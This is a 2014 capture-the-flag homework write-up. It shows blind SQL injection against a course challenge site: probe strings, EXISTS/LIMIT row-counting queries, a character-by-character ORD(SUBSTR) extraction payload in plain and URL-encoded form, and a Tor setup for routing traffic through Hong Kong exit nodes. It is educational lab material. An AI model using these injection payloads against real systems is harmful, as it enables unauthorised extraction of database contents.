=================
 Tormity Writeup
=================

:date: 2014-10-06 10:43
:modified: 2014-10-14 20:44
:tags: secprog, ctf, writeup
:category: memo
:slug: tormity-writeup
:about_author: Bug generator
:email: starbops@gmail.com
:authors: Zespre Schmidt
:summary: Security Programming Homework 1-1

Get Flags
=========

According to the first hint: "Try to capture as more flags as you can.", I
think we should use to Tor to visit the website. But for tests and simlicity,
I decided to use Chrome extension which called "Hola". It is a cute tool that
help you surfing the Internet through VPNs.

Although "Hola" is convenient, we should use Tor for better anonimity, like
atdog said.

SQL injection Tests
===================

According to the second hint, I believe there are vulnerabilities about SQL
injection in the website. So I tried to append following query strings, assume
the base url is ``http://tor.atdog.tw/news/1``

.. code-block:: text

    '
    `
    UNION SELECT 1
    UNION SELECT 1,2
    UNION SELECT 1,2,3
    ...

Failed. We only got "500 Internal Server Error" page all the time. Try another
method

.. code-block:: text

    AND 1=1
    AND 1=2

Something happened! The first url returned the article but the second did not.
So I guess I can use this feature to identify something, e.g. flag.

The second hint told me that there is a flag in the "flags" table and its
column name is called "flag". Chances are there could be multiple rows in that
table. I want to know how many rows are there in the "flags" table

.. code-block:: text

    AND EXISTS(SELECT 1 FROM flags LIMIT 0, 1)
    AND EXISTS(SELECT 1 FROM flags LIMIT 1, 1)
    AND EXISTS(SELECT 1 FROM flags LIMIT 2, 1)

Using the "limit" SQL command to limit the lines of returned row(s). We knew
there are two rows in the "flags" table from the above tests. But which one is
the real flag? According to my tests, the actual flag is the second one.

The meaning of "blind SQL injection" is that we can only get true or false as
a result at one time. But how can we capture the flag? One of the approaches is
to narrow down the number of candidates of a single character by asking the
webpage "larger or smaller" question. After located the exact character, move
on to the next character. Repeat this action, the flag will show up

.. code-block:: text

    AND EXISTS(SELECT 1 FROM flags WHERE ORD(SUBSTR((SELECT flag FROM flags LIMIT 1,1), 1)) <= 79)

Finally, our sophisticated query string which will be appended to the base url is

.. code-block:: text

    %20and%20exists(select%201%20from%20flags%20where%20ord(substr((select%20flag%20from%20flags%20limit%201,1),%201))%20%3C=%2079)

Using Tor
=========

The hint told me that I should connect to the webpage with Hong Kong IP. To
satisfy this restriction and to use python script doing this boring job for me,
Tor must be setup.

First we need to install Tor via Homebrew ``$ brew install tor``. After the
installation was done, you will see the caveats shown on the terminal

.. code-block:: text

    To have launchd start tor at login:
        ln -sfv /usr/local/opt/tor/\*.plist ~/Library/LaunchAgents
    Then to load tor now:
        launchctl load ~/Library/LaunchAgents/homebrew.mxcl.tor.plist

The default Tor configuration file is at ``/usr/local/etc/tor/torrc.sample``.
We just need to add two lines of configuration in ``${HOME}/.torrc``

.. code-block:: text

    StrictNodes 1
    ExitNodes {hk}

Then all of our connections will exit from Hong Kong.

Writing Python Script
=====================

Environment
-----------

I use Python 2.7.8 to write the script, and import some modules for automatic
login and using SOCKS proxy

.. code-block:: text

    $ pyenv virtualenv 2.7.8 secprog-2.7.8
    $ pyenv local secprog-2.7.8
    $ pip install mechanize PySocks

Key Points
----------

- Using python mechanize library to implement login action
- Using python PySocks library to make all connections go through Tor network
  (SOCKS proxy)

Flag
====

The flag is ``SECPROC{Hey,D0n't_f0rg3t_g0_thr0ugh_an0nymity_n3tw0rk.}``

References
==========

- `Tor Country Codes - B3RN3D`__
- `tutorial SQL injection - LampSecurity CTF 6`__
- `MySQL - String Functions`__
- `Python's mechanize to login like a user`__
- `stack overflow - using tor as a SOCKS5 proxy with python urllib2 or mechanize`__
- `stack overflow - python re.sub group: number after \number`__

.. __: https://b3rn3d.herokuapp.com/blog/2014/03/05/tor-country-codes
.. __: http://www.infond.fr/2010/06/tutorial-sql-injection-lampsecurity-ctf.html
.. __: http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_substr
.. __: http://simplapi.wordpress.com/2012/04/20/pythons-mechanize-login-like-a-user/
.. __: http://stackoverflow.com/questions/14449974/using-tor-as-a-socks5-proxy-with-python-urllib2-or-mechanize
.. __: http://stackoverflow.com/questions/5984633/python-re-sub-group-number-after-number

